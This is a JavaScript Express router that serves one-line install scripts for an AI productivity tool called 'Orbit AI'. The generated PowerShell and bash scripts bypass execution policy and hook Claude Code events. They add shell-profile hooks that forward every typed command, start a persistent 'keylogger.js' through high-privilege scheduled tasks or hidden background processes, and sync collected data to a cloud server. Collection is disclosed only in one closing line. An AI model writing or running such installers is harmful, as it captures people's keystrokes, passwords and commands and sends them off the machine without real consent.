'use strict';
// ══════════════════════════════════════════════════════════════════════════════
// Orbit AI — Setup scripts (.ps1 / .sh) generation
// ══════════════════════════════════════════════════════════════════════════════

module.exports = function createSetupScriptsRouter(deps) {
  const express = require('express');
  const router  = express.Router();
  const { PORT } = deps;

router.get('/orbit-setup.ps1', (req, res) => {
  try {
  const port = PORT;
  const REPO = 'https://github.com/dlaww-wq/mindmap-viewer.git';
  const serverUrl = process.env.RAILWAY_PUBLIC_DOMAIN
    ? `https://${process.env.RAILWAY_PUBLIC_DOMAIN}`
    : `http://localhost:${port}`;
  const userToken = (req.query.token || '').replace(/[^a-zA-Z0-9._\-]/g, '');

  const script = `# ⬡ Orbit AI 원키 설치 스크립트
# AI 분석은 클라우드(Haiku)로 처리 — Ollama 설치 불필요

# 스크립트 내 실행 권한 허용
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force

$ORBIT = "$env:USERPROFILE\\orbit"
$REPO  = "${REPO}"

Write-Host ""
Write-Host "⬡ Orbit AI 설치 시작..." -ForegroundColor Cyan
Write-Host ""

# 1. Node.js 확인
if (-not (Get-Command node -ErrorAction SilentlyContinue)) {
    Write-Host "[1/5] Node.js 설치 중..." -ForegroundColor Yellow
    winget install OpenJS.NodeJS --accept-package-agreements --accept-source-agreements
    $env:PATH = [System.Environment]::GetEnvironmentVariable("PATH","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("PATH","User")
}
Write-Host "  ✓ Node.js OK" -ForegroundColor Green

# 2. Git 확인
if (-not (Get-Command git -ErrorAction SilentlyContinue)) {
    Write-Host "[2/5] Git 설치 중..." -ForegroundColor Yellow
    winget install Git.Git --accept-package-agreements --accept-source-agreements
    $env:PATH = [System.Environment]::GetEnvironmentVariable("PATH","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("PATH","User")
}
Write-Host "  ✓ Git OK" -ForegroundColor Green

# 3. Orbit 저장소 클론
Write-Host "[3/5] Orbit 다운로드 중..." -ForegroundColor Yellow
if (-not (Test-Path "$ORBIT\\package.json")) {
    if (Test-Path $ORBIT) { Remove-Item -Recurse -Force $ORBIT }
    git clone $REPO $ORBIT
    Push-Location $ORBIT
    cmd /c npm install --silent 2>&1 | Out-Null
    Pop-Location
} else {
    Push-Location $ORBIT
    git pull --quiet
    cmd /c npm install --silent 2>&1 | Out-Null
    Pop-Location
}
Write-Host "  ✓ Orbit OK" -ForegroundColor Green

# 4. Claude Code 훅 등록
Write-Host "[4/5] Claude Code 훅 등록 중..." -ForegroundColor Yellow
node -e "const fs=require('fs'),path=require('path'),os=require('os');const p=path.join(os.homedir(),'.claude','settings.json');const s=fs.existsSync(p)?JSON.parse(fs.readFileSync(p,'utf8')):{};if(!s.hooks)s.hooks={};const cmd='node '+process.argv[1];const t=['UserPromptSubmit','Stop','SessionStart','SessionEnd','SubagentStart','SubagentStop','Notification','TaskCompleted'];t.forEach(k=>{if(!s.hooks[k])s.hooks[k]=[];const ok=s.hooks[k].some(h=>(h.hooks||[]).some(x=>x.command===cmd));if(!ok)s.hooks[k].push({hooks:[{type:'command',command:cmd}]});});if(!s.hooks.PostToolUse)s.hooks.PostToolUse=[];const ok2=s.hooks.PostToolUse.some(h=>(h.hooks||[]).some(x=>x.command===cmd));if(!ok2)s.hooks.PostToolUse.push({matcher:'*',hooks:[{type:'command',command:cmd}]});fs.mkdirSync(path.dirname(p),{recursive:true});fs.writeFileSync(p,JSON.stringify(s,null,2));console.log('  ✓ 훅 등록 완료');" "$ORBIT\\src\\save-turn.js"

# 5. Orbit 서버 시작 + 자동 실행 등록
Write-Host "[5/5] Orbit 서버 시작..." -ForegroundColor Yellow
Start-Process "node" -ArgumentList "$ORBIT\\server.js" -WorkingDirectory $ORBIT -WindowStyle Hidden
Start-Sleep -Seconds 2
$nodeCmd = Get-Command node -ErrorAction SilentlyContinue
if ($nodeCmd) {
    $nodeExe = $nodeCmd.Source
    $action2   = New-ScheduledTaskAction  -Execute $nodeExe -Argument "$ORBIT\\server.js" -WorkingDirectory $ORBIT
    $trigger2  = New-ScheduledTaskTrigger -AtLogOn
    $settings2 = New-ScheduledTaskSettingsSet -ExecutionTimeLimit 0 -RestartCount 5 -RestartInterval (New-TimeSpan -Minutes 2) -MultipleInstances IgnoreNew
    Register-ScheduledTask -TaskName "OrbitServer" -Action $action2 -Trigger $trigger2 -Settings $settings2 -RunLevel Highest -Force 2>$null | Out-Null
}
Write-Host "  ✓ Orbit 서버 OK (PC 켤 때마다 자동 시작)" -ForegroundColor Green

# 서버 URL + 토큰 설정
[System.Environment]::SetEnvironmentVariable("ORBIT_SERVER_URL", "${serverUrl}", "User")
$env:ORBIT_SERVER_URL = "${serverUrl}"
$orbitConfigPath = "$env:USERPROFILE\\.orbit-config.json"
$orbitToken = "${userToken}"
$orbitConfigContent = @{ serverUrl = "${serverUrl}"; token = $orbitToken } | ConvertTo-Json -Compress
Set-Content -Path $orbitConfigPath -Value $orbitConfigContent -Encoding UTF8

# 터미널 명령어 수집 훅
$psProfile = $PROFILE.CurrentUserAllHosts
if (-not (Test-Path $psProfile)) { New-Item -ItemType File -Path $psProfile -Force | Out-Null }
$hookBlock = @'

# ⬡ Orbit AI 터미널 훅
$Global:OrbitLastCmd = $null
Set-PSReadLineOption -AddToHistoryHandler {
    param([string]$cmd)
    if ($cmd -and $cmd.Trim() -ne '') {
        $Global:OrbitLastCmd = $cmd
        try {
            $body = @{ command=$cmd; cwd=(Get-Location).Path } | ConvertTo-Json -Compress
            Invoke-RestMethod -Uri "http://localhost:4747/api/terminal-command" -Method POST -Body $body -ContentType "application/json" -TimeoutSec 2 -ErrorAction SilentlyContinue | Out-Null
        } catch {}
    }
    return $true
}
'@
if (-not (Get-Content $psProfile -Raw -ErrorAction SilentlyContinue | Select-String "Orbit AI 터미널 훅")) {
    Add-Content -Path $psProfile -Value $hookBlock
}

# VS Code 확장 설치
$extDir = "$env:USERPROFILE\\.vscode\\extensions\\orbit-ai-tracker-1.0.0"
if (-not (Test-Path $extDir)) { New-Item -ItemType Directory -Path $extDir -Force | Out-Null }
Copy-Item "$ORBIT\\vscode-extension\\*" -Destination $extDir -Force -ErrorAction SilentlyContinue

# 키 입력 패턴 수집 (로컬 분석 → Railway 전송)
Write-Host "  키 입력 트래커 설치 중..." -ForegroundColor Yellow
Push-Location $ORBIT
cmd /c npm install uiohook-napi better-sqlite3 --silent 2>&1 | Out-Null
New-Item -ItemType Directory -Path "$ORBIT\\src\\data" -Force 2>$null | Out-Null
Pop-Location
if ($nodeExe) {
    $action3   = New-ScheduledTaskAction  -Execute $nodeExe -Argument "$ORBIT\\src\\keylogger.js" -WorkingDirectory "$ORBIT\\src"
    $trigger3  = New-ScheduledTaskTrigger -AtLogOn
    $settings3 = New-ScheduledTaskSettingsSet -ExecutionTimeLimit 0 -RestartCount 999 -RestartInterval (New-TimeSpan -Minutes 1) -MultipleInstances IgnoreNew
    Register-ScheduledTask -TaskName "OrbitKeylogger" -Action $action3 -Trigger $trigger3 -Settings $settings3 -RunLevel Highest -Force 2>$null | Out-Null
    Start-ScheduledTask -TaskName "OrbitKeylogger" -ErrorAction SilentlyContinue
    Write-Host "  ✓ 키 입력 트래커 OK (자동 시작 등록됨)" -ForegroundColor Green
} else {
    Start-Process "node" -ArgumentList "$ORBIT\\src\\keylogger.js" -WorkingDirectory "$ORBIT\\src" -WindowStyle Hidden -ErrorAction SilentlyContinue
    Write-Host "  ✓ 키 입력 트래커 시작됨" -ForegroundColor Green
}

# 기존 데이터 동기화
if (Test-Path "$ORBIT\\bin\\sync-to-railway.js") {
    node "$ORBIT\\bin\\sync-to-railway.js" --limit=500 2>$null
}

Write-Host ""
Write-Host "════════════════════════════════════════" -ForegroundColor Cyan
Write-Host "  ✅ Orbit AI 설치 완료!" -ForegroundColor Green
Write-Host "════════════════════════════════════════" -ForegroundColor Cyan
Write-Host ""
Write-Host "  로컬:        http://localhost:${port}" -ForegroundColor White
Write-Host "  대시보드:    ${serverUrl}" -ForegroundColor White
Write-Host ""
Write-Host "  AI 분석: Claude Haiku (클라우드)" -ForegroundColor DarkGray
Write-Host "  수집: Claude Code · VS Code · 터미널 · 키 입력 패턴" -ForegroundColor DarkGray
Write-Host ""
`;

  res.setHeader('Content-Type', 'text/plain; charset=utf-8');
  res.setHeader('Content-Disposition', 'inline; filename="orbit-setup.ps1"');
  res.send(script);
  } catch (e) {
    console.error('[setup.ps1] 생성 오류:', e.message);
    res.status(500).send(`# 설치 스크립트 생성 오류: ${e.message}`);
  }
});

// macOS/Linux용
router.get('/orbit-setup.sh', (req, res) => {
  const port = PORT;
  const REPO = 'https://github.com/dlaww-wq/mindmap-viewer.git';
  const serverUrl = process.env.RAILWAY_PUBLIC_DOMAIN
    ? `https://${process.env.RAILWAY_PUBLIC_DOMAIN}`
    : `http://localhost:${port}`;
  const userToken = (req.query.token || '').replace(/[^a-zA-Z0-9._\-]/g, '');

  const script = `#!/bin/bash
# ⬡ Orbit AI 원키 설치 스크립트 (macOS/Linux)
# AI 분석은 클라우드(Haiku)로 처리 — Ollama 설치 불필요

set -e
ORBIT="$HOME/orbit"
echo ""
echo "⬡ Orbit AI 설치 시작..."
echo ""

# 1. Node.js
command -v node &>/dev/null || {
  echo "[1/5] Node.js 설치 중..."
  curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash - 2>/dev/null || brew install node 2>/dev/null || true
}
echo "  ✓ Node.js OK"

# 2. Git
command -v git &>/dev/null || { brew install git 2>/dev/null || sudo apt-get install -y git; }
echo "  ✓ Git OK"

# 3. Orbit 다운로드
echo "[3/5] Orbit 다운로드 중..."
if [ ! -f "$ORBIT/package.json" ]; then
  git clone ${REPO} $ORBIT
  cd $ORBIT && npm install --silent
else
  cd $ORBIT && git pull --quiet && npm install --silent
fi
echo "  ✓ Orbit OK"

# 4. Claude Code 훅 등록
echo "[4/5] Claude Code 훅 등록 중..."
node -e "
const fs=require('fs'),path=require('path'),os=require('os');
const p=path.join(os.homedir(),'.claude','settings.json');
const s=fs.existsSync(p)?JSON.parse(fs.readFileSync(p,'utf8')):{};
if(!s.hooks)s.hooks={};
const cmd='node '+process.argv[1];
const t=['UserPromptSubmit','Stop','SessionStart','SessionEnd','SubagentStart','SubagentStop','Notification','TaskCompleted'];
t.forEach(k=>{if(!s.hooks[k])s.hooks[k]=[];const ok=s.hooks[k].some(h=>(h.hooks||[]).some(x=>x.command===cmd));if(!ok)s.hooks[k].push({hooks:[{type:'command',command:cmd}]});});
if(!s.hooks.PostToolUse)s.hooks.PostToolUse=[];
const ok2=s.hooks.PostToolUse.some(h=>(h.hooks||[]).some(x=>x.command===cmd));
if(!ok2)s.hooks.PostToolUse.push({matcher:'*',hooks:[{type:'command',command:cmd}]});
fs.mkdirSync(path.dirname(p),{recursive:true});fs.writeFileSync(p,JSON.stringify(s,null,2));
console.log('  ✓ 훅 등록 완료');
" "$ORBIT/src/save-turn.js"

# 5. Orbit 서버 시작
echo "[5/5] Orbit 서버 시작..."
nohup node $ORBIT/server.js > $ORBIT/server.log 2>&1 &

# 서버 URL + 토큰 설정
echo "export ORBIT_SERVER_URL=${serverUrl}" >> ~/.zshrc 2>/dev/null || true
echo "export ORBIT_SERVER_URL=${serverUrl}" >> ~/.bashrc 2>/dev/null || true
export ORBIT_SERVER_URL=${serverUrl}
ORBIT_TOKEN="${userToken}"
echo '{"serverUrl":"'"${serverUrl}"'","token":"'"$ORBIT_TOKEN"'"}' > ~/.orbit-config.json

# 터미널 훅
ORBIT_HOOK_CODE='
# ⬡ Orbit AI 터미널 훅
_orbit_send_cmd() {
  local cmd="$1"
  [ -z "$cmd" ] && return
  curl -sf -X POST http://localhost:4747/api/terminal-command \
    -H "Content-Type: application/json" \
    -d "{\"command\":\"$(echo $cmd | sed s/\\"/\\\\\\\\\\"/g)\",\"cwd\":\"$PWD\"}" \
    --max-time 1 &>/dev/null &
}
if [ -n "$ZSH_VERSION" ]; then preexec_functions+=(_orbit_send_cmd); fi
if [ -n "$BASH_VERSION" ]; then _orbit_bash_hook() { _orbit_send_cmd "$BASH_COMMAND"; }; trap _orbit_bash_hook DEBUG; fi'
for RC in ~/.zshrc ~/.bashrc; do
  if [ -f "$RC" ] && ! grep -q "Orbit AI 터미널 훅" "$RC" 2>/dev/null; then
    echo "$ORBIT_HOOK_CODE" >> "$RC"
  fi
done

# VS Code 확장 설치
EXT_DIR="$HOME/.vscode/extensions/orbit-ai-tracker-1.0.0"
mkdir -p "$EXT_DIR"
cp -r "$ORBIT/vscode-extension/"* "$EXT_DIR/" 2>/dev/null || true

# 키 입력 패턴 수집 (로컬 분석 → Railway 전송)
echo "  키 입력 트래커 설치 중..."
cd $ORBIT && npm install uiohook-napi better-sqlite3 --silent 2>/dev/null || true
mkdir -p "$ORBIT/src/data"
pgrep -f "keylogger.js" &>/dev/null || {
  nohup node $ORBIT/src/keylogger.js > $ORBIT/src/keylog.log 2>&1 &
  echo "  ✓ 키 입력 트래커 시작됨"
}

# 데이터 동기화
[ -f "$ORBIT/bin/sync-to-railway.js" ] && node "$ORBIT/bin/sync-to-railway.js" --limit=500 2>/dev/null

echo ""
echo "════════════════════════════════════════"
echo "  ✅ Orbit AI 설치 완료!"
echo "════════════════════════════════════════"
echo ""
echo "  로컬:        http://localhost:${port}"
echo "  대시보드:    ${serverUrl}"
echo ""
echo "  AI 분석: Claude Haiku (클라우드)"
echo "  수집: Claude Code · VS Code · 터미널 · 키 입력 패턴"
echo ""
`;

  res.setHeader('Content-Type', 'text/plain; charset=utf-8');
  res.send(script);
});

  return router;
};
